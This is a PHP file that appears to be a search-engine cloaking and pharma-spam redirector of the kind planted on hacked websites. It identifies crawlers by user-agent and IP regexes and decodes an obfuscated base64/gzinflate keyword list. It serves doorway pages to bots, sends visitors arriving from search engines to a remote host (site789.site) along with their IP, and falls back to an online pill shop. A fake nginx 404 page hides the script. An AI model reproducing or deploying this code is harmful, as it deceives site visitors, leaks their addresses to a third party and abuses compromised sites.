<?php

function get_url($url) {
	if (function_exists('curl_init')) {
	$cc = curl_init();
	curl_setopt($cc, CURLOPT_URL, $url);
	curl_setopt($cc, CURLOPT_RETURNTRANSFER, true);
	$out = curl_exec($cc);
	curl_close($cc);}
	else $out=file_get_contents($url);
	return $out;
}

$ips=array('66\.249\.[6-9][0-9]\.[0-9]+','74\.125\.[0-9]+\.[0-9]+','65\.5[2-5]\.[0-9]+\.[0-9]+','74\.6\.[0-9]+\.[0-9]+','67\.195\.[0-9]+\.[0-9]+','72\.30\.[0-9]+\.[0-9]+','38\.[0-9]+\.[0-9]+\.[0-9]+','93\.172\.94\.227','212\.100\.250\.218','71\.165\.223\.134','70\.91\.180\.25','65\.93\.62\.242','74\.193\.246\.129','213\.144\.15\.38','195\.92\.229\.2','70\.50\.189\.191','218\.28\.88\.99','165\.160\.2\.20','89\.122\.224\.230','66\.230\.175\.124','218\.18\.174\.27','65\.33\.87\.94','67\.210\.111\.241','81\.135\.175\.70','64\.69\.34\.134','89\.149\.253\.169','64\.233\.1[6-8][1-9]\.[0-9]+','64\.233\.19[0-1]\.[0-9]+','209\.185\.108\.[0-9]+','209\.185\.253\.[0-9]+','209\.85\.238\.[0-9]+','216\.239\.33\.9[6-9]','216\.239\.37\.9[8-9]','216\.239\.39\.9[8-9]','216\.239\.41\.9[6-9]','216\.239\.45\.4','216\.239\.46\.[0-9]+','216\.239\.51\.9[6-9]','216\.239\.53\.9[8-9]','216\.239\.57\.9[6-9]','216\.239\.59\.9[8-9]','216\.33\.229\.163','64\.233\.173\.[0-9]+','64\.68\.8[0-9]\.[0-9]+','64\.68\.9[0-2]\.[0-9]+','72\.14\.199\.[0-9]+','8\.6\.48\.[0-9]+','207\.211\.40\.82','67\.162\.158\.146','66\.255\.53\.123','24\.200\.208\.112','129\.187\.148\.240','129\.187\.148\.244','199\.126\.151\.229','118\.124\.32\.193','89\.149\.217\.191');
$is_bot = false;
if (preg_match("/googlebot|bingbot|slurp/i", $_SERVER["HTTP_USER_AGENT"])) $is_bot = true;
foreach ($ips as $mask) if (preg_match('/'.$mask.'/',$_SERVER['REMOTE_ADDR'])) {
	$is_bot = true;
	break;
}

$pills=gzinflate(base64_decode('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'));
$pills=explode('|',$pills);

if (is_dir('html')) { $dir='html'; $htmls = glob("html/*.html");}
elseif (is_dir('htmls')) { $dir='htmls'; $htmls = glob("htmls/*.html");}
if (isset($dir)) {
	$page=$dir.$_SERVER['REQUEST_URI'];
	if (file_exists($page)) {
		$ps='google.|msn.|altavista.|ask.|yahoo.|aol.|bing.';
		$ps=explode('|',$ps);
		$dat=0;
		if (isset($_SERVER["HTTP_REFERER"])) foreach($ps as $psp) if (strpos(strtolower($_SERVER['HTTP_REFERER']),$psp)) $dat=1;
		
		if ($dat==1 && $is_bot==false) {
			$cont=file_get_contents($page);
			preg_match_all("/<title>(.*)<\/title>/i", $cont, $matches);
			foreach ($matches[1] as $mat) {
				$titl=' '.str_replace(',','',$mat).' ';
				foreach ($pills as $pill) {
					if (stripos($titl,' '.$pill.' ')!==false) {
						$key=$pill;
						break(2);
					}
				}
			}
			if (!isset($key)) $key=trim($titl);
			$url=get_url("http://site789.site/789.php?ip={$_SERVER['REMOTE_ADDR']}&d={$_SERVER['HTTP_HOST']}&key=".base64_encode($key));
			preg_match('/123s(.*)789s/i', $url, $matches);
			if (isset($matches[1])) $url=$matches[1];
			else $url="http://safehotpillstore.com/search.html?a=69774&key=$key";
			header("Location: $url");
			echo "<script>location.href=\"$url\";</script>";
			exit();
		} else {
			echo file_get_contents($page);
			exit();
		}
	}
}
header("HTTP/1.0 404 Not Found");
echo "
<html>
<head><title>404 Not Found</title></head>
<body bgcolor=\"white\">
<center><h1>404 Not Found</h1></center>
<hr><center>nginx</center>
</body>
</html>";